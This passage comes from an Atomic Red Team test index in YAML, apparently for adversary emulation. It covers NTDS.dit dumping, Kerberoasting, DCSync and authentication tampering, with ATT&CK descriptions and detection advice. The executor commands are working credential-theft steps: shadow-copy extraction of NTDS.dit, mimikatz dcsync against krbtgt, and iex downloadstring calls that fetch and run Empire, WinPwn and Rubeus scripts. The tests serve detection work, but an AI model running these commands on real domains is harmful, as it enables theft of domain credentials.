        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
      supported_platforms:
      - windows
      input_arguments:
        drive_letter:
          description: Drive letter to source VSC (including colon)
          type: string
          default: 'C:'
      dependencies:
      - description: 'Target must be a Domain Controller

          '
        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
          ProductType | findstr LanmanNT

          '
        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
          must be done manually

          '
      executor:
        command: 'vssadmin.exe create shadow /for=#{drive_letter}

          '
        name: command_prompt
        elevation_required: true
    - name: Copy NTDS.dit from Volume Shadow Copy
      auto_generated_guid: c6237146-9ea6-4711-85c9-c56d263a6b03
      description: |
        This test is intended to be run on a domain Controller.

        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.

        This test requires steps taken in the test "Create Volume Shadow Copy with vssadmin".
        A successful test also requires the export of the SYSTEM Registry hive.
        This test must be executed on a Windows Domain Controller.
      supported_platforms:
      - windows
      input_arguments:
        vsc_name:
          description: Name of Volume Shadow Copy
          type: string
          default: "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
        extract_path:
          description: Path for extracted NTDS.dit
          type: path
          default: C:\Windows\Temp
      dependencies:
      - description: 'Target must be a Domain Controller

          '
        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
          ProductType | findstr LanmanNT

          '
        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
          must be done manually

          '
      - description: 'Volume shadow copy must exist

          '
        prereq_command: 'if not exist #{vsc_name} (exit /b 1)

          '
        get_prereq_command: 'echo Run "Invoke-AtomicTest T1003.003 -TestName ''Create
          Volume Shadow Copy with vssadmin''" to fulfill this requirement

          '
      - description: 'Extract path must exist

          '
        prereq_command: 'if not exist #{extract_path} (exit /b 1)

          '
        get_prereq_command: 'mkdir #{extract_path}

          '
      executor:
        command: |
          copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
          copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
          reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
        cleanup_command: |
          del "#{extract_path}\ntds.dit"        >nul 2> nul
          del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
          del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
        name: command_prompt
        elevation_required: true
    - name: Dump Active Directory Database with NTDSUtil
      auto_generated_guid: 2364e33d-ceab-4641-8468-bfb1d7cc2723
      description: |
        This test is intended to be run on a domain Controller.

        The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
        uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
        subsequent domain controllers without the need of network-based replication.

        Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.
      supported_platforms:
      - windows
      input_arguments:
        output_folder:
          description: Path where resulting dump should be placed
          type: path
          default: C:\Windows\Temp\ntds_T1003
      dependencies:
      - description: 'Target must be a Domain Controller

          '
        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
          ProductType | findstr LanmanNT

          '
        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
          must be done manually

          '
      executor:
        command: |
          mkdir #{output_folder}
          ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
        cleanup_command: 'rmdir /q /s #{output_folder} >nul 2>&1

          '
        name: command_prompt
        elevation_required: true
    - name: Create Volume Shadow Copy with WMI
      auto_generated_guid: 224f7de0-8f0a-4a94-b5d8-989b036c86da
      description: |
        This test is intended to be run on a domain Controller.

        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
      supported_platforms:
      - windows
      input_arguments:
        drive_letter:
          description: Drive letter to source VSC (including colon and backslash)
          type: string
          default: C:\
      dependencies:
      - description: 'Target must be a Domain Controller

          '
        prereq_command: 'reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
          ProductType | findstr LanmanNT

          '
        get_prereq_command: 'echo Sorry, Promoting this machine to a Domain Controller
          must be done manually

          '
      executor:
        command: 'wmic shadowcopy call create Volume=#{drive_letter}

          '
        name: command_prompt
        elevation_required: true
    - name: Create Volume Shadow Copy remotely with WMI
      auto_generated_guid: d893459f-71f0-484d-9808-ec83b2b64226
      description: |
        This test is intended to be run from a remote workstation with domain admin context.
        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
      supported_platforms:
      - windows
      input_arguments:
        drive_letter:
          description: Drive letter to source VSC (including colon and backslash)
          type: string
          default: C:\
        target_host:
          description: IP Address / Hostname you want to target
          type: string
          default: localhost
      dependencies:
      - description: 'Target must be a reachable Domain Controller, and current context
          must be domain admin

          '
        prereq_command: 'wmic /node:"#{target_host}" shadowcopy list brief

          '
        get_prereq_command: 'echo Sorry, can''t connect to target host, check: network,
          firewall or permissions (must be admin on target)

          '
      executor:
        command: 'wmic /node:"#{target_host}" shadowcopy call create Volume=#{drive_letter}

          '
        name: command_prompt
        elevation_required: true
    - name: Create Volume Shadow Copy remotely (WMI) with esentutl
      auto_generated_guid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
      description: |
        This test is intended to be run from a remote workstation with domain admin context.
        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
      supported_platforms:
      - windows
      input_arguments:
        source_path:
          description: File to shadow copy
          type: string
          default: c:\windows\ntds\ntds.dit
        target_path:
          description: Target path of the result file
          type: string
          default: c:\ntds.dit
        target_host:
          description: IP Address / Hostname you want to target
          type: string
          default: localhost
      dependencies:
      - description: 'Target must be a reachable Domain Controller, and current context
          must be domain admin

          '
        prereq_command: 'wmic /node:"#{target_host}" shadowcopy list brief

          '
        get_prereq_command: 'echo Sorry, can''t connect to target host, check: network,
          firewall or permissions (must be admin on target)

          '
      executor:
        command: 'wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe
          /y /vss #{source_path} /d #{target_path}"

          '
        name: command_prompt
        elevation_required: true
    - name: Create Volume Shadow Copy with Powershell
      auto_generated_guid: 542bb97e-da53-436b-8e43-e0a7d31a6c24
      description: |
        This test is intended to be run on a domain Controller.

        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
      supported_platforms:
      - windows
      input_arguments:
        drive_letter:
          description: Drive letter to source VSC (including colon)
          type: string
          default: C:\
      executor:
        command: "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n"
        name: powershell
        elevation_required: true
    - name: Create Symlink to Volume Shadow Copy
      auto_generated_guid: 21748c28-2793-4284-9e07-d6d028b66702
      description: |
        This test is intended to be run on a domain Controller.

        The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.
      supported_platforms:
      - windows
      input_arguments:
        drive_letter:
          description: Drive letter to source VSC (including colon)
          type: string
          default: 'C:'
        symlink_path:
          description: symlink path
          type: string
          default: C:\Temp\vssstore
      executor:
        command: |
          vssadmin.exe create shadow /for=#{drive_letter}
          mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
        name: command_prompt
        elevation_required: true
  T1558.003:
    technique:
      modified: '2023-03-30T21:01:46.538Z'
      name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
      description: "Adversaries may abuse a valid Kerberos ticket-granting ticket
        (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket
        that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation:
        Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec
        2015) \n\nService principal names (SPNs) are used to uniquely identify each
        instance of a Windows service. To enable authentication, Kerberos requires
        that SPNs be associated with at least one service logon account (an account
        specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting
        Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation:
        SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries
        possessing a valid Kerberos ticket-granting ticket (TGT) may request one or
        more Kerberos ticket-granting service (TGS) service tickets for any SPN from
        a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation:
        AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted
        with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the
        service account associated with the SPN is used as the private key and is
        thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110)
        attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking
        Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation:
        Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using
        service tickets captured from network traffic.(Citation: AdSecurity Cracking
        Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003),
        [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral
        Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:
        SANS Attacking Kerberos Nov 2014)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Praetorian
      x_mitre_detection: 'Enable Audit Kerberos Service Ticket Operations to log Kerberos
        TGS service ticket requests. Particularly investigate irregular patterns of
        activity (ex: accounts making numerous requests, Event ID 4769, within a small
        time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation:
        Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking
        Kerberos Dec 2015)'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Active Directory: Active Directory Credential Request'
      x_mitre_system_requirements:
      - Valid domain account or the ability to sniff traffic within a domain
      type: attack-pattern
      id: attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee
      created: '2020-02-11T18:43:38.588Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1558/003
        external_id: T1558.003
      - source_name: Empire InvokeKerberoast Oct 2016
        description: EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved
          March 22, 2018.
        url: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
      - source_name: AdSecurity Cracking Kerberos Dec 2015
        description: Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets
          Using Kerberoast ‚Äì Exploiting Kerberos to Compromise the Active Directory
          Domain. Retrieved March 22, 2018.
        url: https://adsecurity.org/?p=2293
      - source_name: Microsoft Detecting Kerberoasting Feb 2018
        description: Bani, M. (2018, February 23). Detecting Kerberoasting activity
          using Azure Security Center. Retrieved March 23, 2018.
        url: https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/
      - source_name: Microsoft SPN
        description: Microsoft. (n.d.). Service Principal Names. Retrieved March 22,
          2018.
        url: https://msdn.microsoft.com/library/ms677949.aspx
      - source_name: Microsoft SetSPN
        description: Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN
          Syntax (Setspn.exe). Retrieved March 22, 2018.
        url: https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx
      - source_name: SANS Attacking Kerberos Nov 2014
        description: Medin, T. (2014, November). Attacking Kerberos - Kicking the
          Guard Dog of Hades. Retrieved March 22, 2018.
        url: https://redsiege.com/kerberoast-slides
      - source_name: Harmj0y Kerberoast Nov 2016
        description: Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz.
          Retrieved March 23, 2018.
        url: https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1558.003
    atomic_tests:
    - name: Request for service tickets
      auto_generated_guid: 3f987809-3681-43c8-bcd8-b3ff3a28533a
      description: "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe
        following are further sources and credits for this attack:\n[Kerberoasting
        Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast
        source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen
        executed successfully , the test displays available services with their hashes.
        \nIf the testing domain doesn't have any service principal name configured,
        there is no output\n"
      supported_platforms:
      - windows
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
          Invoke-Kerberoast | fl
        name: powershell
    - name: Rubeus kerberoast
      auto_generated_guid: 14625569-6def-4497-99ac-8e7817105b55
      description: |
        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
      supported_platforms:
      - windows
      input_arguments:
        local_folder:
          description: Local path of Rubeus executable
          type: path
          default: "$Env:temp"
        local_executable:
          description: name of the rubeus executable
          type: string
          default: rubeus.exe
        out_file:
          description: file where command results are stored
          type: string
          default: rubeus_output.txt
        rubeus_url:
          description: URL of Rubeus executable
          type: url
          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
        flags:
          description: command flags you would like to run (optional and blank by
            default)
          type: string
          default: 
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      - description: 'Rubeus must exist

          '
        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
          0} else {exit 1}

          '
        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}

          '
      executor:
        command: |
          klist purge
          cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags} /outfile:"#{local_folder}\#{out_file}"
        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore

          '
        name: powershell
        elevation_required: false
    - name: Extract all accounts in use as SPN using setspn
      auto_generated_guid: e6f4affd-d826-4871-9a62-6c9004b8fe06
      description: "The following test will utilize setspn to extract the Service
        Principal Names. This behavior is typically used during a kerberos or silver
        ticket attack. \nA successful execution will output all the SPNs for the related
        domain. \n"
      supported_platforms:
      - windows
      input_arguments:
        domain_name:
          description: The Domain Name to lookup against
          type: string
          default: "%USERDNSDOMAIN%"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      executor:
        command: 'setspn -T #{domain_name} -Q */*

          '
        name: command_prompt
    - name: Request A Single Ticket via PowerShell
      auto_generated_guid: 988539bc-2ed7-4e62-aec6-7c5cf6680863
      description: "The following test will utilize native PowerShell Identity modules
        to query the domain to extract the Service Principal Names for a single computer.
        This behavior is typically used during a kerberos or silver ticket attack.
        \nA successful execution will output the SPNs for the endpoint in question.\n"
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      executor:
        command: "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\')
          + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
          -ArgumentList \"HTTP/$ComputerFQDN\" \n"
        name: powershell
    - name: Request All Tickets via PowerShell
      auto_generated_guid: 902f4ed2-1aba-4133-90f2-cff6d299d6da
      description: "The following test will utilize native PowerShell Identity modules
        to query the domain to extract allthe Service Principal Names. This behavior
        is typically used during a kerberos or silver ticket attack. \nA successful
        execution will output the SPNs for the domain in question.\n"
      supported_platforms:
      - windows
      input_arguments:
        domain_name:
          description: The Domain Name to lookup against
          type: string
          default: "%USERDNSDOMAIN%"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Computer must be domain joined

          '
        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
          {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Joining this computer to a domain must be
          done manually

          '
      executor:
        command: "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name}
          -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
          -ArgumentList $_.Context.PostContext[0].Trim() }  \n"
        name: powershell
    - name: WinPwn - Kerberoasting
      auto_generated_guid: 78d10e20-c874-45f2-a9df-6fea0120ec27
      description: Kerberoasting technique via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          Kerberoasting -consoleoutput -noninteractive
        name: powershell
    - name: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
      auto_generated_guid: 29094950-2c96-4cbd-b5e4-f7c65079678f
      description: PowerSharpPack - Kerberoasting Using Rubeus technique via function
        of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
          Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
        name: powershell
  T1003.006:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - ExtraHop
      - Vincent Le Toux
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163
      type: attack-pattern
      created: '2020-02-11T18:45:34.293Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1003.006
        url: https://attack.mitre.org/techniques/T1003/006
      - url: https://msdn.microsoft.com/library/cc228086.aspx
        description: Microsoft. (2017, December 1). MS-DRSR Directory Replication
          Service (DRS) Remote Protocol. Retrieved December 4, 2017.
        source_name: Microsoft DRSR Dec 2017
      - url: https://msdn.microsoft.com/library/dd207691.aspx
        description: Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December
          4, 2017.
        source_name: Microsoft GetNCCChanges
      - url: https://wiki.samba.org/index.php/DRSUAPI
        description: SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017.
        source_name: Samba DRSUAPI
      - url: https://source.winehq.org/WineAPI/samlib.html
        description: Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017.
        source_name: Wine API samlib.dll
      - url: https://adsecurity.org/?p=1729
        description: Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation,
          and Detection. Retrieved August 7, 2017.
        source_name: ADSecurity Mimikatz DCSync
      - url: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/
        description: Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids,
          Oh My. Retrieved August 7, 2017.
        source_name: Harmj0y Mimikatz and DCSync
      - url: https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM
        description: Warren, J. (2017, July 11). Manipulating User Passwords with
          Mimikatz. Retrieved December 4, 2017.
        source_name: InsiderThreat ChangeNTLM July 2017
      - url: https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
        description: Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved
          August 7, 2017.
        source_name: GitHub Mimikatz lsadump Module
      - url: https://msdn.microsoft.com/library/cc237008.aspx
        description: Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol.
          Retrieved December 6, 2017.
        source_name: Microsoft NRPC Dec 2017
      - url: https://msdn.microsoft.com/library/cc245496.aspx
        description: Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote
          Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017.
        source_name: Microsoft SAMR
      - url: https://adsecurity.org/?p=1729
        description: Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation,
          and Detection. Retrieved December 4, 2017.
        source_name: AdSecurity DCSync Sept 2015
      - url: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/
        description: Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids,
          Oh My. Retrieved December 4, 2017.
        source_name: Harmj0y DCSync Sept 2015
      modified: '2021-04-22T20:20:14.595Z'
      name: 'OS Credential Dumping: DCSync'
      description: |-
        Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.

        Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)

        DCSync functionality has been included in the "lsadump" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)

        Note: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      - 'Active Directory: Active Directory Object Access'
      x_mitre_permissions_required:
      - Administrator
      identifier: T1003.006
    atomic_tests:
    - name: DCSync (Active Directory)
      auto_generated_guid: 129efd28-8497-4c87-a1b0-73b9a870ca3e
      description: |
        Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
        Works against a remote Windows Domain Controller using the replication protocol.
        Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
        [Reference](https://adsecurity.org/?p=1729)
      supported_platforms:
      - windows
      input_arguments:
        domain:
          description: Targeted Active Directory domain
          type: string
          default: "%userdnsdomain%"
        user:
          description: Targeted user
          type: string
          default: krbtgt
        mimikatz_path:
          description: Mimikatz windows executable
          type: path
          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Mimikatz executor must exist on disk and at specified location
          (#{mimikatz_path})

          '
        prereq_command: |
          $mimikatz_path = cmd /c echo #{mimikatz_path}
          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
        get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"
          -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl
          = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath
          = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\"
          $basePath\n"
      executor:
        name: command_prompt
        elevation_required: false
        command: '#{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}"
          "exit"

          '
    - name: Run DSInternals Get-ADReplAccount
      auto_generated_guid: a0bced08-3fc5-4d8b-93b7-e8344739376e
      description: "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon
        successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/)
        CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n"
      supported_platforms:
      - windows
      input_arguments:
        logonserver:
          description: ComputerName argument default %logonserver%
          type: string
          default: $ENV:logonserver.TrimStart("\")
      dependency_executor_name: powershell
      dependencies:
      - description: 'DSInternals must be installed

          '
        prereq_command: |
          $RequiredModule = Get-Module -Name DSInternals -ListAvailable
          if (-not $RequiredModule) {exit 1}
          if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}
        get_prereq_command: 'Install-Module -Name DSInternals -Scope CurrentUser -Force

          '
      executor:
        command: 'Get-ADReplAccount -All -Server #{logonserver}

          '
        name: powershell
        elevation_required: false
  T1556:
    technique:
      modified: '2023-04-11T03:17:32.211Z'
      name: Modify Authentication Process
      description: |-
        Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

        Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_contributors:
      - Chris Ross @xorrior
      x_mitre_deprecated: false
      x_mitre_detection: "Monitor for new, unfamiliar DLL files written to a domain
        controller and/or local computer. Monitor for changes to Registry entries
        for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification
        Packages</code>) and correlate then investigate the DLL files these files
        reference. \n\nPassword filters will also show up as an autorun and loaded
        DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\n\nMonitor
        for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe
        running on a domain controller as well as for malicious modifications to functions
        exported from authentication-related system DLLs (such as cryptdll.dll and
        samsrv.dll).(Citation: Dell Skeleton) \n\nMonitor PAM configuration and module
        paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools
        such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor
        for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.(Citation:
        Xorrior Authorization Plugins)\n\nConfigure robust, consistent account activity
        audit policies across the enterprise and with externally accessible services.
        (Citation: TechNet Audit Policy) Look for suspicious account behavior across
        systems that share accounts, either user, admin, or service accounts. Examples:
        one account logged into multiple systems simultaneously; multiple accounts
        logged into the same machine simultaneously; accounts logged in at odd times
        or outside of business hours. Activity may be from interactive login sessions
        or process ownership from accounts being used to execute binaries on a remote
        system as a particular account. Correlate other security systems with login
        information (e.g., a user has an active login session but has not entered
        the building or does not have VPN access).\n\nMonitor property changes in
        Group Policy that manage authentication mechanisms (i.e. [Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)).
        The <code>Store passwords using reversible encryption</code> configuration
        should be set to Disabled. Additionally, monitor and/or block suspicious command/script
        execution of <code>-AllowReversiblePasswordEncryption $true</code>, <code>Set-ADUser</code>
        and <code>Set-ADAccountControl</code>. Finally, monitor Fine-Grained Password
